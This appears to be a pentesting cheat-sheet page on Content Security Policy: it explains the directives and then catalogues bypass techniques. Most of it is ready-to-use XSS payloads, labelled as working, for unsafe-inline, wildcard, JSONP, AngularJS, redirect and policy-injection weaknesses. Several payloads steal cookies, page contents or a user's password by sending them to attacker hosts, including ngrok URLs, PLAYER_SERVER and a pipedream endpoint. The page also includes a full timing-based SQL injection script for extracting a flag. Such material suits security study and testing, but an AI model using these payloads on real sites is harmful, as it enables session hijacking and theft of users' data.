a built-in browser technology which\nhelps protect from attacks such as cross-site scripting (XSS)\n. It lists and describes paths and sources, from which the browser can safely load resources. The resources may include images, frames, javascript and more. Here is an example of resources being allowed from the local domain (self) to be loaded and executed in-line and allow string code executing functions like\neval\n,\nsetTimeout\nor\nsetInterval:\nContent Security Policy is implemented via\nresponse headers\nor\nmeta elements of the HTML page\n. The browser follows the received policy and actively blocks violations as they are detected.\nImplemented via response header:\nContent-Security-policy\n:\ndefault-src 'self'; img-src 'self' allowed-website.com; style-src 'self';\nImplemented via meta tag:\n<\nmeta\nhttp-equiv\n=\n\"\nContent-Security-Policy\n\"\ncontent\n=\n\"\ndefault-src 'self'; img-src https://*; child-src 'none';\n\"\n>\nHeaders\nContent-Security-Policy\nContent-Security-Policy-Report-Only\nThis one won't block anything, only send reports (use in Pre environment).\nDefining resources\nCSP works by restricting the origins from where active and passive content can be loaded from. It can additionally restrict certain aspects of active content such as the execution of inline javascript, and the use of\neval()\n.\ndefault-src 'none';\nimg-src 'self';\nscript-src 'self' https://code.jquery.com;\nstyle-src 'self';\nreport-uri /cspreport\nfont-src 'self' https://addons.cdn.mozilla.net;\nframe-src 'self' https://ic.paypal.com https://paypal.com;\nmedia-src https://videos.cdn.mozilla.net;\nobject-src 'none';\nDirectives\nscript-src\n: This directive specifies allowed sources for JavaScript. This includes not only URLs loaded directly into elements, but also things like inline script event handlers (onclick) and XSLT stylesheets which can trigger script execution.\ndefault-src\n: This directive defines the policy for fetching resources by default. When fetch directives are absent in the CSP header the browser follows this directive by default.\nChild-src\n: This directive defines allowed resources for web workers and embedded frame contents.\nconnect-src\n: This directive restricts URLs to load using interfaces like fetch, websocket, XMLHttpRequest\nframe-src\n: This directive restricts URLs to frames that can be called out.\nframe-ancestors\n: This directive specifies the sources that can embed the current page. This directive applies to\n<frame>\n,\n<iframe>\n,\n<object>\n,\n<embed>\n, or\n<applet>\n. This directive can't be used in tags and applies only to non-HTML resources.\nimg-src\n: It defines allowed sources to load images on the web page.\nfont-src:\ndirective specifies valid sources for fonts loaded using\n@font-face\n.\nmanifest-src\n: This directive defines allowed sources of application manifest files.\nmedia-src\n: It defines allowed sources from where media objects can be loaded.\nobject-src\n: It defines allowed sources for the <object>, <embed>, and <applet> elements elements.\nbase-uri\n: It defines allowed URLs which can be loaded using an element.\nform-action\n: This directive lists valid endpoints for submission from tags.\nplugin-types\n: It defines limits on the kinds of mime types a page may invoke.\nupgrade-insecure-requests\n: This directive instructs browsers to rewrite URL schemes, changing HTTP to HTTPS. This directive can be useful for websites with large numbers of old URLs that need to be rewritten.\nsandbox\n: sandbox directive enables a sandbox for the requested resource similar to the sandbox attribute. It applies restrictions to a page's actions including preventing popups, preventing the execution of plugins and scripts, and enforcing a same-origin policy.\nSources\n*: This allows any URL except\ndata:\n,\nblob:\n,\nfilesystem:\nschemes\nself\n: This source defines that loading of resources on the page is allowed from the same domain.\ndata\n: This source allows loading resources via the data scheme (eg Base64 encoded images)\nnone\n: This directive allows nothing to be loaded from any source.\nunsafe-eval\n: This allows the use of eval() and similar methods for creating code from strings. This is not a safe practice to include this source in any directive. For the same reason, it is named unsafe.\nunsafe-hashes\n: This allows to enable of specific inline event handlers.\nunsafe-inline\n: This allows the use of inline resources, such as inline elements, javascript: URLs, inline event handlers, and inline elements. Again this is not recommended for security reasons.\nnonce\n: A whitelist for specific inline scripts using a cryptographic nonce (number used once). The server must generate a unique nonce value each time it transmits a policy.\nsha256-<hash>\n: Whitelist scripts with an specific sha256 hash\nstrict-dynamic\n: It allows the browser to load and execute new JavaScript tags in the DOM from any script source that has previously been whitelisted by a \"nonce\" or \"hash\" value.\nhost\n: Indicate a host such as example.com\nUnsafe CSP Rules\n'unsafe-inline'\nContent-Security-Policy\n:\nscript\n-\nsrc https\n:\n//google.com 'unsafe\n-\ninline';\nWorking payload:\n\"/><script>alert(1);</script>\nself + 'unsafe-inline' via Iframes\nCSP bypass: self + 'unsafe-inline' with Iframes\n'unsafe-eval'\nContent-Security-Policy\n:\nscript\n-\nsrc https\n:\n//google.com 'unsafe\n-\neval';\nWorking payload:\n<\nscript\nsrc\n=\n\"\ndata:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==\n\"\n>\n</\nscript\n>\nstrict-dynamic\nIf you can somehow make an\nallowed JS code created a new script tag\nin the DOM with your JS code, because an allowed script is creating it, the\nnew script tag will be allowed to be executed\n.\nWildcard (*)\nContent-Security-Policy\n:\nscript-src 'self' https://google.com https\n:\ndata\n*;\nWorking payload:\n\"/>'>\n<\nscript\nsrc\n=\nhttps://attacker-website.com/evil.js\n>\n</\nscript\n>\n\"/>'>\n<\nscript\nsrc\n=\ndata:text/javascript,alert(1337)\n>\n</\nscript\n>\nLack of object-src and default-src\nIt looks like this is not longer working\nContent-Security-Policy\n:\nscript\n-\nsrc 'self' ;\nWorking payloads:\n<\nobject\ndata\n=\n\"\ndata:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\n\"\n>\n</\nobject\n>\n\">'>\n<\nobject\ntype\n=\n\"\napplication/x-shockwave-flash\n\"\ndata\n=\n'\nhttps: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\\\"})))}catch(e) {alert(1337)}//\n'\n>\n<\nparam\nname\n=\n\"\nAllowScriptAccess\n\"\nvalue\n=\n\"\nalways\n\"\n>\n</\nobject\n>\nFile Upload + 'self'\nContent-Security-Policy\n:\nscript\n-\nsrc 'self';  object\n-\nsrc 'none' ;\nIf you can upload a JS file you can bypass this CSP:\nWorking payload:\n\"/>'>\n<\nscript\nsrc\n=\n\"\n/uploads/picture.png.js\n\"\n>\n</\nscript\n>\nHowever, it's highly probable that the server is\nvalidating the uploaded file\nand will only allow you to\nupload determined type of files\n.\nMoreover, even if you could upload a\nJS code inside\na file using an extension accepted by the server (like:\nscript.png\n) this won't be enough because some servers like apache server\nselect MIME type of the file based on the extension\nand browsers like Chrome will\nreject to execute Javascript\ncode inside something that should be an image. \"Hopefully\", there are mistakes. For example, from a CTF I learnt that\nApache doesn't know\nthe\n.wave\nextension, therefore it doesn't serve it with a\nMIME type like audio/*\n.\nFrom here, if you find a XSS and a file upload, and you manage to find a\nmisinterpreted extension\n, you could try to upload a file with that extension and the Content of the script. Or, if the server is checking the correct format of the uploaded file, create a polyglot (\nsome polyglot examples here\n).\nThird Party Endpoints + ('unsafe-eval')\nFor some of the following payload\nunsafe-eval\nis not even needed\n.\nContent-Security-Policy\n:\nscript\n-\nsrc https\n:\n//cdnjs.cloudflare.com 'unsafe\n-\neval';\nLoad a vulnerable version of angular and execute arbitrary JS:\n<\nscript\nsrc\n=\n\"\nhttps://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js\n\"\n>\n</\nscript\n>\n<\ndiv\nng-app\n>\n{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}}\n</\ndiv\n>\n‚Äã\n‚Äã\n\">\n<\nscript\nsrc\n=\n\"\nhttps://cdnjs.cloudflare.com/angular.min.js\n\"\n>\n</\nscript\n>\n<\ndiv\nng-app\nng-csp\n>\n{{$eval.constructor('alert(1)')()}}\n</\ndiv\n>\n‚Äã\n‚Äã\n\">\n<\nscript\nsrc\n=\n\"\nhttps://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js\n\"\n>\n</\nscript\n>\n<\ndiv\nng-app\nng-csp\nid\n=\np\nng-click\n=\n$event.view.alert(1337)\n>\n‚Äã\n‚Äã\nWith some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/\n<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js>\n</\nscript\n>\n<iframe/ng-app/ng-csp/srcdoc=\"\n<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>\n</\nscript\n>\n<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>\"\n>\nPayloads using Angular + a library with functions that return the\nwindow\nobject (\ncheck out this post\n):\nThe post shows that you could\nload\nall\nlibraries\nfrom\ncdn.cloudflare.com\n(or any other allowed JS libraries repo), execute all added functions from each library, and check\nwhich functions from which libraries return the\nwindow\nobject\n.\n<\nscript\nsrc\n=\n\"\nhttps://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js\n\"\n>\n</\nscript\n>\n<\nscript\nsrc\n=\n\"\nhttps://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js\n\"\n/>\n</\nscript\n>\n<\ndiv\nng-app\nng-csp\n>\n{{$on.curry.call().alert(1)}}\n{{[].empty.call().alert([].empty.call().document.domain)}}\n{{ x = $on.curry.call().eval(\"fetch('http://localhost/index.php').then(d => {})\") }}\n</\ndiv\n>\n‚Äã\n‚Äã\n<\nscript\nsrc\n=\n\"\nhttps://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js\n\"\n>\n</\nscript\n>\n<\nscript\nsrc\n=\n\"\nhttps://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js\n\"\n>\n</\nscript\n>\n<\ndiv\nng-app\nng-csp\n>\n{{$on.curry.call().alert('xss')}}\n</\ndiv\n>\n‚Äã\n‚Äã\n<\nscript\nsrc\n=\n\"\nhttps://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js\n\"\n>\n</\nscript\n>\n<\nscript\nsrc\n=\n\"\nhttps://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js\n\"\n>\n</\nscript\n>\n<\ndiv\nng-app\nng-csp\n>\n{{[].erase.call().alert('xss')}}\n</\ndiv\n>\n‚Äã\nAbusing google recaptcha JS code\nAccording to\nthis CTF writeup\nyou can abuse\nhttps://www.google.com/recaptcha/\ninside a CSP to execute arbitrary JS code bypassing the CSP:\n<\ndiv\nng-controller\n=\n\"\nCarouselController as c\n\"\nng-init\n=\n\"\nc.init()\n\"\n>\n&#91[c.element.ownerDocument.defaultView.parent.location=\"http://google.com?\"+c.element.ownerDocument.cookie]]\n<\ndiv\ncarousel\n>\n<\ndiv\nslides\n>\n</\ndiv\n>\n</\ndiv\n>\n‚Äã\n<\nscript\nsrc\n=\n\"\nhttps://www.google.com/recaptcha/about/js/main.min.js\n\"\n>\n</\nscript\n>\nThird Party Endpoints + JSONP\nContent-Security-Policy\n:\nscript-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';\nScenarios like this where\nscript-src\nis set to\nself\nand a particular domain which is whitelisted can be bypassed using JSONP. JSONP endpoints allow insecure callback methods which allow an attacker to perform XSS, working payload:\n\">\n<\nscript\nsrc\n=\n\"\nhttps://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1\n\"\n>\n</\nscript\n>\n\">\n<\nscript\nsrc\n=\n\"\n/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//\n\"\n>\n</\nscript\n>\nhttps://www.youtube.com/oembed?callback=alert;\n<\nscript\nsrc\n=\n\"\nhttps://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})\n\"\n>\n</\nscript\n>\n‚Äã\nJSONBee\ncontains ready to use JSONP endpoints to CSP bypass of different websites.\nThe same vulnerability will occur if the\ntrusted endpoint contains an Open Redirect\nbecause if the initial endpoint is trusted, redirects are trusted.\nThird Party Abuses\nAs described in the\nfollowing post\n, there are many third party domains, that might be allowed somewhere in the CSP, can be abused to either exfiltrate data or execute JavaScript code. Some of these third-parties are:\nEntity\nAllowed Domain\nCapabilities\nFacebook\nwww.facebook.com, *.facebook.com\nExfil\nHotjar\n*.hotjar.com, ask.hotjar.io\nExfil\nJsdelivr\n*.jsdelivr.com, cdn.jsdelivr.net\nExec\nAmazon CloudFront\n*.cloudfront.net\nExfil, Exec\nAmazon AWS\n*.amazonaws.com\nExfil, Exec\nAzure Websites\n*.azurewebsites.net, *.azurestaticapps.net\nExfil, Exec\nSalesforce Heroku\n*.herokuapp.com\nExfil, Exec\nGoogle Firebase\n*.firebaseapp.com\nExfil, Exec\nIf you find any of the allowed domains in the CSP of your target, chances are that you might be able to bypass the CSP by registering on the third-party service and, either exfiltrate data to that service or to execute code.\nFor example, if you find the following CSP:\nContent-Security-Policy‚Äã: default-src 'self‚Äô www.facebook.com;‚Äã\nor\nContent-Security-Policy‚Äã: connect-src www.facebook.com;‚Äã\nYou should be able to exfiltrate data, similarly as it has always be done with\nGoogle Analytics\n/\nGoogle Tag Manager\n. In this case, you follow these general steps:\n1.\nCreate a Facebook Developer account here.\n2.\nCreate a new \"Facebook Login\" app and select \"Website\".\n3.\nGo to \"Settings -> Basic\" and get your \"App ID\"\n4.\nIn the target site you want to exfiltrate data from, you can exfiltrate data by directly using the Facebook SDK gadget \"fbq\" through a \"customEvent\" and the data payload.\n5.\nGo to your App \"Event Manager\" and select the application you created (note the event manager could be found in an URL similar to this: https://www.facebook.com/events_manager2/list/pixel/[app-id]/test_events\n6.\nSelect the tab \"Test Events\" to see the events being sent out by \"your\" web site.\nThen, on the victim side, you execute the following code to initialize the Facebook tracking pixel to point to the attacker's Facebook developer account app-id and issue a custom event like this:\nfbq('init', '1279785999289471');‚Äã // this number should be the App ID of the attacker's Meta/Facebook account\nfbq('trackCustom', 'My-Custom-Event',{‚Äã\ndata: \"Leaked user password: '\"+document.getElementById('user-password').innerText+\"'\"‚Äã\n});\nAs for the other seven third-party domains specified in the previous table, there are many other ways you can abuse them. Refer to the previously\nblog post\nfor additional explanations about other third-party abuses.\nBypass via RPO (Relative Path Overwrite)\nIn addition to the aforementioned redirection to bypass path restrictions, there is another technique called Relative Path Overwrite (RPO) that can be used on some servers.\nFor example, if CSP allows the path\nhttps://example.com/scripts/react/\n, it can be bypassed as follows:\n<\nscript\nsrc\n=\n\"\nhttps://example.com/scripts/react/..%2fangular%2fangular.js\n\"\n>\n</\nscript\n>\nThe browser will ultimately load\nhttps://example.com/scripts/angular/angular.js\n.\nThis works because for the browser, you are loading a file named\n..%2fangular%2fangular.js\nlocated under\nhttps://example.com/scripts/react/\n, which is compliant with CSP.\nHowever, for certain servers, when receiving the request, they will decode it, effectively requesting\nhttps://example.com/scripts/react/../angular/angular.js\n, which is equivalent to\nhttps://example.com/scripts/angular/angular.js\n.\nBy\nexploiting this inconsistency in URL interpretation between the browser and the server, the path rules can be bypassed\n.\nThe solution is to not treat\n%2f\nas\n/\non the server-side, ensuring consistent interpretation between the browser and the server to avoid this issue.\nOnline Example:\n‚Äã\nhttps://jsbin.com/werevijewa/edit?html,output\n‚Äã\nIframes JS execution\nIframes in XSS, CSP and SOP\nmissing\nbase-uri\nIf the\nbase-uri\ndirective is missing you can abuse it to perform a\ndangling markup injection\n.\nMoreover, if the\npage is loading a script using a relative path\n(like\n<script src=\"/js/app.js\">\n) using a\nNonce\n, you can abuse the\nbase\ntag\nto make it\nload\nthe script from\nyour own server achieving a XSS.\nIf the vulnerable page is loaded with\nhttpS\n, make use an httpS url in the base.\n<\nbase\nhref\n=\n\"\nhttps://www.attacker.com/\n\"\n>\nAngularJS events\nDepending on the specific policy, the CSP will block JavaScript events. However, AngularJS defines its own events that can be used instead. When inside an event, AngularJS defines a special\n$event\nobject, which simply references the browser event object. You can use this object to perform a CSP bypass. On Chrome, there is a special property on the\n$event/event\nobject called\npath\n. This property contains an array of objects that causes the event to be executed. The last property is always the\nwindow\nobject, which we can use to perform a sandbox escape. By passing this array to the\norderBy\nfilter, we can enumerate the array and use the last element (the\nwindow\nobject) to execute a global function, such as\nalert()\n. The following code demonstrates this:\n<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x\n?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x\nFind other Angular bypasses in\nhttps://portswigger.net/web-security/cross-site-scripting/cheat-sheet\n‚Äã\nAngularJS and whitelisted domain\nContent-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;\nIf the application is using angular JS and scripts are loaded from a whitelisted domain. It is possible to bypass this CSP policy by calling callback functions and vulnerable classes. For more details visit this awesome\ngit\nrepo.\nWorking payloads:\n<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337>\n</\nscript\n>\nng-app\"ng-csp ng-click=$event.view.alert(1337)>\n<\nscript\nsrc\n=\n//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js\n>\n</\nscript\n>\n‚Äã\n<!-- no longer working -->\n<\nscript\nsrc\n=\n\"\nhttps://www.googleapis.com/customsearch/v1?callback=alert(1)\n\"\n>\nOther JSONP arbitrary execution endpoints can be found in\nhere\n(some of them were deleted or fixed)\nBypass via Redirection\nWhat happens when CSP encounters server-side redirection? If the redirection leads to a different origin that is not allowed, it will still fail.\nHowever, according to the description in\nCSP spec 4.2.2.3. Paths and Redirects\n, if the redirection leads to a different path, it can bypass the original restrictions.\nHere's an example:\n<!\nDOCTYPE\nhtml\n>\n<\nhtml\n>\n<\nhead\n>\n<\nmeta\nhttp-equiv\n=\n\"\nContent-Security-Policy\n\"\ncontent\n=\n\"\nscript-src http://localhost:5555 https://www.google.com/a/b/c/d\n\"\n>\n</\nhead\n>\n<\nbody\n>\n<\ndiv\nid\n=\nuserContent\n>\n<\nscript\nsrc\n=\n\"\nhttps://https://www.google.com/test\n\"\n>\n</\nscript\n>\n<\nscript\nsrc\n=\n\"\nhttps://https://www.google.com/a/test\n\"\n>\n</\nscript\n>\n<\nscript\nsrc\n=\n\"\nhttp://localhost:5555/301\n\"\n>\n</\nscript\n>\n</\ndiv\n>\n</\nbody\n>\n</\nhtml\n>\nIf CSP is set to\nhttps://www.google.com/a/b/c/d\n, since the path is considered, both\n/test\nand\n/a/test\nscripts will be blocked by CSP.\nHowever, the final\nhttp://localhost:5555/301\nwill be\nredirected on the server-side to\nhttps://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//\n. Since it is a redirection, the\npath is not considered\n, and the\nscript can be loaded\n, thus bypassing the path restriction.\nWith this redirection, even if the path is specified completely, it will still be bypassed.\nTherefore, the best solution is to ensure that the website does not have any open redirect vulnerabilities and that there are no domains that can be exploited in the CSP rules.\nBypass CSP with dangling markup\nRead\nhow here\n.\n'unsafe-inline'; img-src *; via XSS\ndefault-src 'self' 'unsafe-inline'; img-src *;\n'unsafe-inline'\nmeans that you can execute any script inside the code (XSS can execute code) and\nimg-src *\nmeans that you can use in the webpage any image from any resource.\nYou can bypass this CSP by exfiltrating the data via images (in this occasion the XSS abuses a CSRF where a page accessible by the bot contains an SQLi, and extract the flag via an image):\n<\nscript\n>\nfetch\n(\n'http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23'\n).\nthen\n(\n_\n=>\n_\n.\ntext\n()).\nthen\n(\n_\n=>\nnew\nImage\n().\nsrc\n=\n'http://PLAYER_SERVER/?'\n+\n_\n)\n</\nscript\n>\nFrom:\nhttps://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle\n‚Äã\nYou could also abuse this configuration to\nload javascript code inserted inside an image\n. If for example, the page allows loading images from Twitter. You could\ncraft\nan\nspecial image\n,\nupload\nit to Twitter and abuse the \"\nunsafe-inline\n\" to\nexecute\na JS code (as a regular XSS) that will\nload\nthe\nimage\n,\nextract\nthe\nJS\nfrom it and\nexecute\nit\n:\nhttps://www.secjuice.com/hiding-javascript-in-png-csp-bypass/\n‚Äã\nWith Service Workers\nService workers\nimportScripts\nfunction isn't limited by CSP:\nAbusing Service Workers\nPolicy Injection\nResearch:\nhttps://portswigger.net/research/bypassing-csp-with-policy-injection\n‚Äã\nChrome\nIf a\nparameter\nsent by you is being\npasted inside\nthe\ndeclaration\nof the\npolicy,\nthen you could\nalter\nthe\npolicy\nin some way that makes\nit useless\n. You could\nallow script 'unsafe-inline'\nwith any of these bypasses:\nscript-src-elem *\n;\nscript-src-attr *\nscript-src-elem\n'unsafe-inline'\n;\nscript-src-attr\n'unsafe-inline'\nBecause this directive will\noverwrite existing script-src directives\n.\nYou can find an example here:\nhttp://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E\n‚Äã\nEdge\nIn Edge is much simpler. If you can add in the CSP just this:\n;_\nEdge\nwould\ndrop\nthe entire\npolicy\n.\nExample:\nhttp://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E\n‚Äã\nimg-src *; via XSS (iframe) - Time attack\nNotice the lack of the directive\n'unsafe-inline'\nThis time you can make the victim\nload\na page in\nyour control\nvia\nXSS\nwith a\n<iframe\n. This time you are going to make the victim access the page from where you want to extract information (\nCSRF\n). You cannot access the content of the page, but if somehow you can\ncontrol the time the page needs to load\nyou can extract the information you need.\nThis time a\nflag\nis going to be extracted, whenever a\nchar is correctly guessed\nvia SQLi the\nresponse\ntakes\nmore time\ndue to the sleep function. Then, you will be able to extract the flag:\n<\niframe name\n=\nf id\n=\ng\n></\niframe\n>\n// The bot will load an URL with the payload\n<\nscript\n>\nlet\nhost\n=\n\"http://x-oracle-v1.nn9ed.ka0labs.org\"\n;\nfunction\ngen\n(\nx\n)\n{\nx\n=\nescape\n(\nx\n.\nreplace\n(\n/\n_\n/\ng\n,\n'\\\\_'\n));\nreturn\n`\n${\nhost\n}\n/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'\n${\nx\n}\n%25'and%201=sleep(0.1)%23\n`\n;\n}\n‚Äã\nfunction\ngen2\n(\nx\n)\n{\nx\n=\nescape\n(\nx\n);\nreturn\n`\n${\nhost\n}\n/admin/search/x'union%20select(1)from%20challenge%20where%20flag='\n${\nx\n}\n'and%201=sleep(0.1)%23\n`\n;\n}\n‚Äã\nasync\nfunction\nquery\n(\nword\n,\nend\n=\nfalse\n)\n{\nlet\nh\n=\nperformance\n.\nnow\n();\nf\n.\nlocation\n=\n(\nend\n?\ngen2\n(\nword\n)\n:\ngen\n(\nword\n));\nawait\nnew\nPromise\n(\nr\n=>\n{\ng\n.\nonload\n=\nr\n;\n});\nlet\ndiff\n=\nperformance\n.\nnow\n()\n-\nh\n;\nreturn\ndiff\n>\n300\n;\n}\n‚Äã\nlet\nalphabet\n=\n'_abcdefghijklmnopqrstuvwxyz0123456789'\n.\nsplit\n(\n''\n);\nlet\npostfix\n=\n'}'\n‚Äã\nasync\nfunction\nrun\n()\n{\nlet\nprefix\n=\n'nn9ed{'\n;\nwhile\n(\ntrue\n)\n{\nlet\ni\n=\n0\n;\nfor\n(\ni\n;\ni\n<\nalphabet\n.\nlength\n;\ni\n++\n)\n{\nlet\nc\n=\nalphabet\n[\ni\n];\nlet\nt\n=\nawait\nquery\n(\nprefix\n+\nc\n);\n// Check what chars returns TRUE or FALSE\nconsole\n.\nlog\n(\nprefix\n,\nc\n,\nt\n);\nif\n(\nt\n)\n{\nconsole\n.\nlog\n(\n'FOUND!'\n)\nprefix\n+=\nc\n;\nbreak\n;\n}\n}\nif\n(\ni\n==\nalphabet\n.\nlength\n)\n{\nconsole\n.\nlog\n(\n'missing chars'\n);\nbreak\n;\n}\nlet\nt\n=\nawait\nquery\n(\nprefix\n+\n'}'\n,\ntrue\n);\nif\n(\nt\n)\n{\nprefix\n+=\n'}'\n;\nbreak\n;\n}\n}\nnew\nImage\n().\nsrc\n=\n'http://PLAYER_SERVER/?'\n+\nprefix\n;\n//Exfiltrate the flag\nconsole\n.\nlog\n(\nprefix\n);\n}\n‚Äã\nrun\n();\n</\nscript\n>\nVia Bookmarklets\nThis attack would imply some social engineering where the attacker\nconvinces the user to drag and drop a link over the bookmarklet of the browser\n. This bookmarklet would contain\nmalicious javascript\ncode that when drag&dropped or clicked would be executed in the context of the current web window,\nbypassing CSP and allowing to steal sensitive information\nsuch as cookies or tokens.\nFor more information\ncheck the original report here\n.\nCSP bypass by restricting CSP\nIn\nthis CTF writeup\n, CSP is bypassed by injecting inside an allowed iframe a more restrictive CSP that disallowed to load a specific JS file that, then, via\nprototype pollution\nor\ndom clobbering\nallowed to\nabuse a different script to load an arbitrary script\n.\nYou can\nrestrict a CSP of an Iframe\nwith the\ncsp\nattribute:\n<\niframe\nsrc\n=\n\"\nhttps://biohazard-web.2023.ctfcompetition.com/view/[bio_id]\n\"\ncsp\n=\n\"\nscript-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'\n\"\n>\n</\niframe\n>\nIn\nthis CTF writeup\n, it was possible via\nHTML injection\nto\nrestrict\nmore a\nCSP\nso a script preventing CSTI was disabled and therefore the\nvulnerability became exploitable.\nCSP can be made more restrictive using\nHTML meta tags\nand inline scripts can disabled\nremoving\nthe\nentry\nallowing their\nnonce\nand\nenable specific inline script via sha\n:\n<\nmeta\nhttp-equiv\n=\n\"\nContent-Security-Policy\n\"\ncontent\n=\n\"\nscript-src 'self'\n'unsafe-eval' 'strict-dynamic'\n'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='\n'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';\n\"\n>\nJS exfiltration with Content-Security-Policy-Report-Only\nIf you can manage to make the server responds with the header\nContent-Security-Policy-Report-Only\nwith a\nvalue controlled by you\n(maybe because of a CRLF), you could make it point your server and if you\nwraps\nthe\nJS content\nyou want to exfiltrate with\n<script>\nand because highly probable\nunsafe-inline\nisn't allowed by the CSP, this will\ntrigger a CSP error\nand part of the script (containing the sensitive info) will be sent to the server from\nContent-Security-Policy-Report-Only\n.\nFor an example\ncheck this CTF writeup\n.\n‚Äã\nCVE-2020-6519\n‚Äã\ndocument\n.\nquerySelector\n(\n'DIV'\n).\ninnerHTML\n=\n\"<iframe src='javascript:var s = document.createElement(\\\"script\\\");s.src = \\\"https://pastebin.com/raw/dw5cWGK6\\\";document.body.appendChild(s);'></iframe>\"\n;\nLeaking Information CSP + Iframe\nImagine a situation where a\npage is redirecting\nto a different\npage with a secret depending\non the\nuser\n. For example, the user\nadmin\naccessing\nredirectme.domain1.com\nis redirected to\nadminsecret321.domain2.com\nand you can cause an XSS to the admin.\nAlso pages that are redirected aren't allowed by the security policy, but the page that redirects is.\nYou can leak the domain where the admin is redirected through:\nthrough CSP violation\nthrough CSP rules.\nThe CSP violation is an instant leak. All that needs to be done is to load an iframe pointing to\nhttps://redirectme.domain1.com\nand listen to\nsecuritypolicyviolation\nevent which contains\nblockedURI\nproperty containing the domain of the blocked URI. That is because the\nhttps://redirectme.domain1.com\n(allowed by CSP) redirects to\nhttps://adminsecret321.domain2.com\n(\nblocked by CSP\n). This makes use of undefined behavior of how to handle iframes with CSP. Chrome and Firefox behave differently regarding this.\nWhen you know the characters that may compose the secret subdomain, you can also use a binary search and check when the CSP blocked the resource and when not creating different forbidden domains in the CSP (in this case the secret can be in the form doc-X-XXXX.secdrivencontent.dev)\nimg-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev\nTrick from\nhere\n.\nHackenProof is home to all crypto bug bounties.\nGet rewarded without delays\nHackenProof bounties launch only when their customers deposit the reward budget. You'll get the reward after the bug is verified.\nGet experience in web3 pentesting\nBlockchain protocols and smart contracts are the new Internet! Master web3 security at its rising days.\nBecome the web3 hacker legend\nGain reputation points with each verified bug and conquer the top of the weekly leaderboard.\n‚Äã\nSign up on HackenProof\nstart earning from your hacks!\nHackenProof\nUnsafe Technologies to Bypass CSP\nPHP response buffer overload\nPHP is known for\nbuffering the response to 4096\nbytes by default. Therefore, if PHP is showing a warning, by providing\nenough data inside warnings\n, the\nresponse\nwill be\nsent\nbefore\nthe\nCSP header\n, causing the header to be ignored.\nThen, the technique consists basically in\nfilling the response buffer with warnings\nso the CSP header isn't sent.\nIdea from\nthis writeup\n.\nRewrite Error Page\nFrom\nthis writeup\nit looks like it was possible to bypass a CSP protection by loading an error page (potentially without CSP) and rewriting its content.\na\n=\nwindow\n.\nopen\n(\n'/'\n+\n'x'\n.\nrepeat\n(\n4100\n));\nsetTimeout\n(\nfunction\n()\n{\na\n.\ndocument\n.\nbody\n.\ninnerHTML\n=\n`\n<img src=x onerror=\"fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))\">\n`\n;\n},\n1000\n);\nSOME + 'self' + wordpress\nSOME is a technique that abuses an XSS (or highly limited XSS)\nin an endpoint of a page\nto\nabuse\nother endpoints of the same origin.\nThis is done by loading the vulnerable endpoint from an attacker page and then refreshing the attacker page to the real endpoint in the same origin you want to abuse. This way the\nvulnerable endpoint\ncan use the\nopener\nobject in the\npayload\nto\naccess the DOM\nof the\nreal endpoint to abuse\n. For more information check:\nSOME - Same Origin Method Execution\nMoreover,\nwordpress\nhas a\nJSONP\nendpoint in\n/wp-json/wp/v2/users/1?_jsonp=data\nthat will\nreflect\nthe\ndata\nsent in the output (with the limitation of only letter, numbers and dots).\nAn attacker can abuse that endpoint to\ngenerate a SOME attack\nagainst WordPress and\nembed\nit inside\n<script 